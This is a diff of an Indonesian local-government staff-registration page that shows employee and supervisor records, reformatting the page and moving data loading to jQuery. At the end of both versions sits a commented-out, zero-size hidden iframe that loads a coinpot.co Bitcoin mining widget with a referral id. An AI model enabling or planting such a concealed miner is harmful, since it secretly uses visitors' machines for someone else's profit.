@@ -2,398 +2,404 @@
 <html lang="en">
 
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
-    <link rel="icon" href="favicon.ico" type="image/x-icon" />
-    <link href="https://fonts.googleapis.com/css?family=Roboto&display=swap" rel="stylesheet" />
-    <link rel="stylesheet" type="text/css" href="./css/style.css">
-    <title>DISDIKBUD PAREPARE Pendaftaran</title>
-    <style>
-        .logoutWrap {
-            text-align: right;
-            background-color: rgb(48, 156, 214);
-            position: sticky;
-            position: -webkit-sticky;
-            top: 0;
-            margin: 0;
-            z-index: 1;
-        }
-        
-        .logoutButton {
-            border-left: oldlace 2px solid;
-            background-color: rgb(226, 81, 81);
-        }
-        
-        .wrapheader {
-            padding: 15px;
-            /* background-color: #1fc8db;
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  <link rel="icon" href="favicon.ico" type="image/x-icon" />
+  <link href="https://fonts.googleapis.com/css?family=Roboto&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" type="text/css" href="./css/style.css">
+  <title>DISDIKBUD PAREPARE Pendaftaran</title>
+  <style>
+    .logoutWrap {
+      text-align: right;
+      background-color: rgb(48, 156, 214);
+      position: sticky;
+      position: -webkit-sticky;
+      top: 0;
+      margin: 0;
+      z-index: 1;
+    }
+
+    .logoutButton {
+      border-left: oldlace 2px solid;
+      background-color: rgb(226, 81, 81);
+    }
+
+    .wrapheader {
+      padding: 15px;
+      /* background-color: #1fc8db;
             color: floralwhite; */
-            height: 150px;
-            border-bottom: 2px solid whitesmoke;
-            display: table-cell;
-            vertical-align: middle;
-        }
-        
-        .wrapbody {
-            visibility: hidden;
-            padding: 5%;
-            overflow: auto;
-        }
-        
-        td {
-            padding: 2%;
-            text-align: left;
-            vertical-align: middle;
-        }
-        
-        td:nth-child(event) {
-            text-align: right;
-        }
-        
-        .title {
-            font-size: 3.5vw;
-            line-height: 150%;
-        }
-        
-        .footer {
-            font-size: small;
-            line-height: 150%;
-        }
-        
-        table {
-            min-width: 475px;
-            /* max-width: 550px; */
-        }
-        
-        .loading {
-            text-align: center;
-            position: sticky;
-            top: 40vh;
-        }
-        
-        .mendaftar {
-            padding: 10px;
-            border: none;
-            outline-style: none;
-            color: rgb(255, 255, 255);
-            background-color: rgb(72, 155, 33);
-            margin-left: 1%;
-            margin-top: 5%;
-            cursor: pointer;
-            -webkit-box-shadow: 3px 3px 7px 1px #4f4f4f;
-            box-shadow: 3px 3px 7px 1px #4f4f4f;
-        }
-        
-        .mendaftar:hover {
-            -webkit-box-shadow: 0px 10px 13px -7px #000000, 3px 3px 7px 1px rgba(79, 79, 79, 0);
-            box-shadow: 0px 10px 13px -7px #000000, 3px 3px 7px 1px rgba(79, 79, 79, 0);
-        }
-        
-        #syuaib {
-            position: fixed;
-            right: 2%;
-            bottom: 0;
-            font-size: smaller;
-            color: rgb(219, 219, 219);
-            text-shadow: 1px 1px 2px #4f2215;
-        }
-        
-        h3,
-        h5 {
-            color: rgb(63, 62, 62);
-        }
-        
-        .gmd {
-            -webkit-box-shadow: 0 14px 28px rgba(0, 0, 0, 0.25), 0 10px 10px rgba(0, 0, 0, 0.22);
-            -moz-box-shadow: 0 14px 28px rgba(0, 0, 0, 0.25), 0 10px 10px rgba(0, 0, 0, 0.22);
-            -ms-box-shadow: 0 14px 28px rgba(0, 0, 0, 0.25), 0 10px 10px rgba(0, 0, 0, 0.22);
-            -o-box-shadow: 0 14px 28px rgba(0, 0, 0, 0.25), 0 10px 10px rgba(0, 0, 0, 0.22);
-            box-shadow: 0 14px 28px rgba(0, 0, 0, 0.25), 0 10px 10px rgba(0, 0, 0, 0.22);
-        }
-        
-        .backform {
-            background-color: rgba(255, 255, 255, 0.75);
-        }
-        
-        .wrapterkirim {
-            width: 100%;
-            height: 100%;
-            /* background-color: grey; */
-            position: fixed;
-            z-index: 2;
-            /* text-align: center; */
-            display: none;
-        }
-        
-        .terkirim {
-            top: 40%;
-            position: relative;
-        }
-        
-        .terkirim button {
-            display: block;
-            padding: 15px;
-            background-color: rgb(72, 155, 33);
-            color: whitesmoke;
-            border: none;
-            margin-left: 95px;
-        }
-        
-        #tdnama {
-            width: 50%;
-        }
-        
-        input[type="file"] {
-            height: 32px;
-            width: 100px;
-            cursor: pointer;
-        }
-        
-        input[type="file"]::-webkit-file-upload-button {
-            height: 32px;
-            width: 100px;
-            cursor: pointer;
-        }
-        
-        .uploadInp {
-            position: absolute;
-            opacity: 0;
-            cursor: pointer;
-        }
-        
-        .upload {
-            width: 100px;
-            border: none;
-            background-color: rgb(0, 141, 7);
-            color: aliceblue;
-            padding: 9px;
-        }
-        
-        .namaBerkas {
-            font-size: 8px;
-            margin-left: 5px;
-        }
-        
-        #idAsn {
-            max-width: 500px;
-            /* border-bottom: #4f4f4f 1px solid; */
-        }
-        /* @media screen and (max-width: 437px) {
+      height: 150px;
+      border-bottom: 2px solid whitesmoke;
+      display: table-cell;
+      vertical-align: middle;
+    }
+
+    .wrapbody {
+      visibility: hidden;
+      padding: 5%;
+      overflow: auto;
+    }
+
+    td {
+      padding: 2%;
+      text-align: left;
+      vertical-align: middle;
+    }
+
+    td:nth-child(event) {
+      text-align: right;
+    }
+
+    .title {
+      font-size: 3.5vw;
+      line-height: 150%;
+    }
+
+    .footer {
+      font-size: small;
+      line-height: 150%;
+    }
+
+    table {
+      min-width: 475px;
+      /* max-width: 550px; */
+    }
+
+    .loading {
+      text-align: center;
+      position: sticky;
+      top: 40vh;
+    }
+
+    .mendaftar {
+      padding: 10px;
+      border: none;
+      outline-style: none;
+      color: rgb(255, 255, 255);
+      background-color: rgb(72, 155, 33);
+      margin-left: 1%;
+      margin-top: 5%;
+      cursor: pointer;
+      -webkit-box-shadow: 3px 3px 7px 1px #4f4f4f;
+      box-shadow: 3px 3px 7px 1px #4f4f4f;
+    }
+
+    .mendaftar:hover {
+      -webkit-box-shadow: 0px 10px 13px -7px #000000, 3px 3px 7px 1px rgba(79, 79, 79, 0);
+      box-shadow: 0px 10px 13px -7px #000000, 3px 3px 7px 1px rgba(79, 79, 79, 0);
+    }
+
+    #syuaib {
+      position: fixed;
+      right: 2%;
+      bottom: 0;
+      font-size: smaller;
+      color: rgb(219, 219, 219);
+      text-shadow: 1px 1px 2px #4f2215;
+    }
+
+    h3,
+    h5 {
+      color: rgb(63, 62, 62);
+    }
+
+    .gmd {
+      -webkit-box-shadow: 0 14px 28px rgba(0, 0, 0, 0.25), 0 10px 10px rgba(0, 0, 0, 0.22);
+      -moz-box-shadow: 0 14px 28px rgba(0, 0, 0, 0.25), 0 10px 10px rgba(0, 0, 0, 0.22);
+      -ms-box-shadow: 0 14px 28px rgba(0, 0, 0, 0.25), 0 10px 10px rgba(0, 0, 0, 0.22);
+      -o-box-shadow: 0 14px 28px rgba(0, 0, 0, 0.25), 0 10px 10px rgba(0, 0, 0, 0.22);
+      box-shadow: 0 14px 28px rgba(0, 0, 0, 0.25), 0 10px 10px rgba(0, 0, 0, 0.22);
+    }
+
+    .backform {
+      background-color: rgba(255, 255, 255, 0.75);
+    }
+
+    .wrapterkirim {
+      width: 100%;
+      height: 100%;
+      /* background-color: grey; */
+      position: fixed;
+      z-index: 2;
+      /* text-align: center; */
+      display: none;
+    }
+
+    .terkirim {
+      top: 40%;
+      position: relative;
+    }
+
+    .terkirim button {
+      display: block;
+      padding: 15px;
+      background-color: rgb(72, 155, 33);
+      color: whitesmoke;
+      border: none;
+      margin-left: 95px;
+    }
+
+    #tdnama {
+      width: 50%;
+    }
+
+    input[type="file"] {
+      height: 32px;
+      width: 100px;
+      cursor: pointer;
+    }
+
+    input[type="file"]::-webkit-file-upload-button {
+      height: 32px;
+      width: 100px;
+      cursor: pointer;
+    }
+
+    .uploadInp {
+      position: absolute;
+      opacity: 0;
+      cursor: pointer;
+    }
+
+    .upload {
+      width: 100px;
+      border: none;
+      background-color: rgb(0, 141, 7);
+      color: aliceblue;
+      padding: 9px;
+    }
+
+    .namaBerkas {
+      font-size: 8px;
+      margin-left: 5px;
+    }
+
+    #idAsn {
+      max-width: 500px;
+      /* border-bottom: #4f4f4f 1px solid; */
+    }
+
+    /* @media screen and (max-width: 437px) {
         table {
           min-width: 390px;
           max-width: 500px;
         }
       } */
-    </style>
+  </style>
 </head>
 
 <body>
-    <div class="logoutWrap">
-        <ul class="nav">
-            <li class="nav masukan">Beranda</li>
-            <li class="nav logoutButton">KELUAR</li>
-        </ul>
+  <div class="logoutWrap">
+    <ul class="nav">
+      <li class="nav masukan">Beranda</li>
+      <li class="nav logoutButton">KELUAR</li>
+    </ul>
+  </div>
+  <div class="wrap">
+    <div class="wrapheader">
+      <span class="title">DINAS PENDIDIKAN DAN KEBUDAYAAN KOTA PAREPARE <br />BIDANG
+        KEPEGAWAIAN</span>
     </div>
-    <div class="wrap">
-        <div class="wrapheader">
-            <span class="title">DINAS PENDIDIKAN DAN KEBUDAYAAN KOTA PAREPARE <br />BIDANG
-          KEPEGAWAIAN</span
-        >
-      </div>
-      <div class="loading">
-        <img src="./image/Eclipse.svg" alt="loading" />
-      </div>
-      <div class="wrapbody">
-        <table id="idAsn">
-          <tr>
-            <td style="width: 40%;">NAMA</td>
-            <td style="width: 2%;">:</td>
-            <td style="width: 58%;" id="tblNama"></td>
-          </tr>
-          <tr>
-            <td>NIP</td>
-            <td>:</td>
-            <td id="tblNip"></td>
-          </tr>
-          <tr>
-            <td>NUPTK</td>
-            <td>:</td>
-            <td id="tblNuptk"></td>
-          </tr>
-          <tr>
-            <td>NO. KARPEG</td>
-            <td>:</td>
-            <td id="tblKarpeg"></td>
-          </tr>
-          <tr>
-            <td>TEMPAT LAHIR</td>
-            <td>:</td>
-            <td id="tblTempatLahir"></td>
-          </tr>
-          <tr>
-            <td>TANGGAL LAHIR</td>
-            <td>:</td>
-            <td id="tblTglLahir"></td>
-          </tr>
-          <tr>
-            <td>JENIS KELAMIN</td>
-            <td>:</td>
-            <td id="tblJk"></td>
-          </tr>
-          <tr>
-            <td>PENDIDIKAN TERAKHIR</td>
-            <td>:</td>
-            <td id="tblPendidikan"></td>
-          </tr>
-          <tr>
-            <td>PANGKAT</td>
-            <td>:</td>
-            <td id="tblPangkat"></td>
-          </tr>
-          <tr>
-            <td>GOLONGAN</td>
-            <td>:</td>
-            <td id="tblGolongan"></td>
-          </tr>
-          <tr>
-            <td>TMT PANGKAT TERAKHIR</td>
-            <td>:</td>
-            <td id="tblTmtPangkat"></td>
-          </tr>
-          <tr>
-            <td>TMT JABATAN GURU</td>
-            <td>:</td>
-            <td id="tblTmtJabatan"></td>
-          </tr>
-          <tr>
-            <td>MASA KERJA GOLONGAN</td>
-            <td>:</td>
-            <td id="tblMkg"></td>
-          </tr>
-          <tr>
-            <td>UNIT KERJA</td>
-            <td>:</td>
-            <td id="tblUnit"></td>
-          </tr>
-          <tr>
-            <td colspan="3">ATASAN LANGSUNG</td>
-          </tr>
-          <tr>
-            <td>NAMA</td>
-            <td>:</td>
-            <td id="tblNamaAtasan"></td>
-          </tr>
-          <tr>
-            <td>NIP</td>
-            <td>:</td>
-            <td id="tblNipAtasan"></td>
-          </tr>
-          <tr>
-            <td>PANGKAT</td>
-            <td>:</td>
-            <td id="tblPangkatAtasan"></td>
-          </tr>
-          <tr>
-            <td>GOLONGAN</td>
-            <td>:</td>
-            <td id="tblGolonganAtasan"></td>
-          </tr>
-          <tr>
-            <td>TMT PANGKAT TERAKHIR</td>
-            <td>:</td>
-            <td id="tblTmtPangkatAtasan"></td>
-          </tr>
-          <tr>
-            <td>JABATAN</td>
-            <td>:</td>
-            <td id="tblJabatanAtasan"></td>
-          </tr>
-        </table>
-        <button class="mendaftar" id="simpan">Selanjutnya</button>
-      </div>
-
-      <div class="wrapfooter">
-        <p class="footer">
-          Naik Pangkat dan Kenaikan Gaji Berkala secara online diselenggarakan
-          untuk mempermudah setiap ASN dalam melakukan proses pendaftaran dan
-          mempercepat proses administrasi kepegawaian di lingkup Dinas
-          Pendidikan dan Kebudayaan Kota Parepare
-        </p>
-      </div>
+    <div class="loading">
+      <img src="./image/Eclipse.svg" alt="loading" />
+    </div>
+    <div class="wrapbody">
+      <table id="idAsn">
+        <tr>
+          <td style="width: 50%;">NAMA</td>
+          <td style="width: 2%;">:</td>
+          <td style="width: 58%;" id="tblNama"></td>
+        </tr>
+        <tr>
+          <td>NIP</td>
+          <td>:</td>
+          <td id="tblNip"></td>
+        </tr>
+        <tr>
+          <td>NUPTK</td>
+          <td>:</td>
+          <td id="tblNuptk"></td>
+        </tr>
+        <tr>
+          <td>NO. KARPEG</td>
+          <td>:</td>
+          <td id="tblKarpeg"></td>
+        </tr>
+        <tr>
+          <td>TEMPAT LAHIR</td>
+          <td>:</td>
+          <td id="tblTempatLahir"></td>
+        </tr>
+        <tr>
+          <td>TANGGAL LAHIR</td>
+          <td>:</td>
+          <td id="tblTglLahir"></td>
+        </tr>
+        <tr>
+          <td>JENIS KELAMIN</td>
+          <td>:</td>
+          <td id="tblJk"></td>
+        </tr>
+        <tr>
+          <td>PENDIDIKAN TERAKHIR</td>
+          <td>:</td>
+          <td id="tblPendidikan"></td>
+        </tr>
+        <tr>
+          <td>PANGKAT</td>
+          <td>:</td>
+          <td id="tblPangkat"></td>
+        </tr>
+        <tr>
+          <td>GOLONGAN</td>
+          <td>:</td>
+          <td id="tblGolongan"></td>
+        </tr>
+        <tr>
+          <td>TMT PANGKAT TERAKHIR</td>
+          <td>:</td>
+          <td id="tblTmtPangkat"></td>
+        </tr>
+        <tr>
+          <td>TMT JABATAN GURU</td>
+          <td>:</td>
+          <td id="tblTmtJabatan"></td>
+        </tr>
+        <tr>
+          <td>MASA KERJA GOLONGAN</td>
+          <td>:</td>
+          <td id="tblMkg"></td>
+        </tr>
+        <tr>
+          <td>UNIT KERJA</td>
+          <td>:</td>
+          <td id="tblUnit"></td>
+        </tr>
+        <tr>
+          <td colspan="3">ATASAN LANGSUNG</td>
+        </tr>
+        <tr>
+          <td>NAMA</td>
+          <td>:</td>
+          <td id="tblNamaAtasan"></td>
+        </tr>
+        <tr>
+          <td>NIP</td>
+          <td>:</td>
+          <td id="tblNipAtasan"></td>
+        </tr>
+        <tr>
+          <td>PANGKAT</td>
+          <td>:</td>
+          <td id="tblPangkatAtasan"></td>
+        </tr>
+        <tr>
+          <td>GOLONGAN</td>
+          <td>:</td>
+          <td id="tblGolonganAtasan"></td>
+        </tr>
+        <tr>
+          <td>TMT PANGKAT TERAKHIR</td>
+          <td>:</td>
+          <td id="tblTmtPangkatAtasan"></td>
+        </tr>
+        <tr>
+          <td>JABATAN</td>
+          <td>:</td>
+          <td id="tblJabatanAtasan"></td>
+        </tr>
+      </table>
+      <button class="mendaftar" id="simpan">Selanjutnya</button>
     </div>
 
-    <!-- <p id="syuaib">Code/Design By syuaib</p> -->
-    <script src="./js/main.js"></script>
-    <script>
-      let logoutButton = document.querySelector(".logoutButton");
-      let wrapbody = document.querySelector(".wrapbody");
-      let wrapterkirim = document.querySelector(".wrapterkirim");
-      let tutup = document.querySelector("#tutup");
-      let loading = document.querySelector(".loading");
-      let simpan = document.querySelector("#simpan");
-      let skTerakhir = document.querySelector("#skTerakhir");
-      let barisBerkas = document.querySelectorAll("tr");
-      let berkas = document.querySelectorAll("input");
-      let masukan = document.querySelector(".masukan");
-      let btnUpload = document.querySelectorAll(".upload");
-      let namaBerkas = document.querySelectorAll(".namaBerkas");
-      masukan.addEventListener("click", () => location.assign("status.html"));
-      var i;
+    <div class="wrapfooter">
+      <p class="footer">
+        Naik Pangkat dan Kenaikan Gaji Berkala secara online diselenggarakan
+        untuk mempermudah setiap ASN dalam melakukan proses pendaftaran dan
+        mempercepat proses administrasi kepegawaian di lingkup Dinas
+        Pendidikan dan Kebudayaan Kota Parepare
+      </p>
+    </div>
+  </div>
 
-      //////////////////////////cek login/////////////////////
-      if (main.ambilDb("nip") == null || main.ambilDb("nip") == "") {
-        location.assign("index.html");
-      } else {
-        main.cekLogin(main.ambilDb("nip")).then((data) => {
-          if (JSON.parse(data) == false) {
-            location.assign("index.html");
-          } else {
-            let tblNama = document.querySelector("#tblNama");
-            let tblNip = document.querySelector("#tblNip");
-            async function simpanDb() {
-              if (main.ambilDb("db") == null || main.ambilDb("db") == "") {
-                await main.simpanDb(data);
-              }
-              let dataPegawai = JSON.parse(main.ambilDb("db"));
-              tblNama.innerHTML = dataPegawai.nama;
-              tblNip.innerHTML = dataPegawai.nip;
-              loading.setAttribute("style", "display:none");
-              wrapbody.setAttribute("style", "visibility:visible");
-            }
-            simpanDb();
-          }
-        });
-      }
+  <!-- <p id="syuaib">Code/Design By syuaib</p> -->
+  <script src="/js/main.js"></script>
+  <script src="/js/jquery.js"></script>
+  <script>
+    let logoutButton = document.querySelector(".logoutButton");
+    let wrapbody = document.querySelector(".wrapbody");
+    let wrapterkirim = document.querySelector(".wrapterkirim");
+    let tutup = document.querySelector("#tutup");
+    let loading = document.querySelector(".loading");
+    let simpan = document.querySelector("#simpan");
+    let skTerakhir = document.querySelector("#skTerakhir");
+    let barisBerkas = document.querySelectorAll("tr");
+    let berkas = document.querySelectorAll("input");
+    let masukan = document.querySelector(".masukan");
+    let btnUpload = document.querySelectorAll(".upload");
+    let namaBerkas = document.querySelectorAll(".namaBerkas");
+    masukan.addEventListener("click", () => location.assign("status.html"));
+    var i;
 
-      //////////////////////get index input button //////////////////////
-      for (i = 0; i < berkas.length; i++) {
-        (function (index) {
-          berkas[i].onchange = function () {
-            console.log(index);
-            namaBerkas[index].innerHTML = berkas[index].files[0].name;
-          };
-        })(i);
-      }
+    main.cekLogin();
+    //////////////////////////cek login/////////////////////
 
-      //////////////////upload process/////////////////
-      simpan.addEventListener("click", ()=>location.assign('upload.html'));
+            let dataPegawai = JSON.parse(localStorage.getItem("db"));
+            $('#tblNama').html(dataPegawai.NAMA);
+            $('#tblNip').html(dataPegawai.NIP);
+            $('#tblNuptk').html(dataPegawai.NUPTK);
+            $('#tblKarpeg').html(dataPegawai.NO_KARPEG);
+            $('#tblTempatLahir').html(dataPegawai.TEMPAT_LAHIR);
+$('#tblTglLahir').html(dataPegawai.TANGGAL_LAHIR)
+$('#tblJk').html(dataPegawai.JENIS_KELAMIN)
+$('#tblPendidikan').html(dataPegawai.PENDIDIKAN_TERAKHIR)
+$('#tblPangkat').html(dataPegawai.PANGKAT)
+$('#tblGolongan').html(dataPegawai.GOLONGAN)
+$('#tblTmtPangkat').html(dataPegawai.TMT_PANGKAT_TERAKHIR)
+$('#tblTmtJabatan').html(dataPegawai.TMT_JABATAN_GURU)
+$('#tblMkg').html(dataPegawai.MASA_KERJA_GOLONGAN)
+$('#tblUnit').html(dataPegawai.UNIT_KERJA)
+$('#tblNamaAtasan').html(dataPegawai.NAMA_ATASAN_LANGSUNG)
+$('#tblNipAtasan').html(dataPegawai.NIP_ATASAN_LANGSUNG)
+$('#tblPangkatAtasan').html(dataPegawai.PANGKAT_ATASAN_LANGSUNG)
+$('#tblGolonganAtasan').html(dataPegawai.GOLONGAN_ATASAN_LANGSUNG)
+$('#tblTmtPangkatAtasan').html(dataPegawai.TMT_PANGKAT_TERAKHIR_ATASAN_LANGSUNG)
+$('#tblJabatanAtasan').html(dataPegawai.JABATAN_ATASAN_LANGSUNG)
 
-      ///////////////////sign out//////////////////////////////////////////////
-      logoutButton.addEventListener("click", keluar);
+            loading.setAttribute("style", "display:none");
+            wrapbody.setAttribute("style", "visibility:visible");
+         
 
-      function keluar() {
-        loading.setAttribute("style", "display:block");
-        wrapbody.setAttribute("style", "display:none");
-        main.logout().then((data) => {
-          if (data == "false") {
-            localStorage.removeItem("db");
-            localStorage.removeItem("nip");
-            location.assign("index.html");
-          }
-        });
-      }
-    </script>
-    <!-- <iframe scrolling="no" frameborder="0" src="https://coinpot.co/mine/bitcoincore/?ref=0C052766283C&mode=widget" style="overflow:hidden;width:0;height:0;"></iframe> -->
-  </body>
+    //////////////////////get index input button //////////////////////
+    for (i = 0; i < berkas.length; i++) {
+      (function (index) {
+        berkas[i].onchange = function () {
+          console.log(index);
+          namaBerkas[index].innerHTML = berkas[index].files[0].name;
+        };
+      })(i);
+    }
+
+    //////////////////upload process/////////////////
+    simpan.addEventListener("click", () => location.assign('upload.html'));
+
+    ///////////////////sign out//////////////////////////////////////////////
+    logoutButton.addEventListener("click", keluar);
+
+    function keluar() {
+      loading.setAttribute("style", "display:block");
+      wrapbody.setAttribute("style", "display:none");
+      main.logout().then((data) => {
+        if (data == "false") {
+          localStorage.removeItem("db");
+          localStorage.removeItem("nip");
+          location.assign("index.html");
+        }
+      });
+    }
+  </script>
+  <!-- <iframe scrolling="no" frameborder="0" src="https://coinpot.co/mine/bitcoincore/?ref=0C052766283C&mode=widget" style="overflow:hidden;width:0;height:0;"></iframe> -->
+</body>
+
 </html>
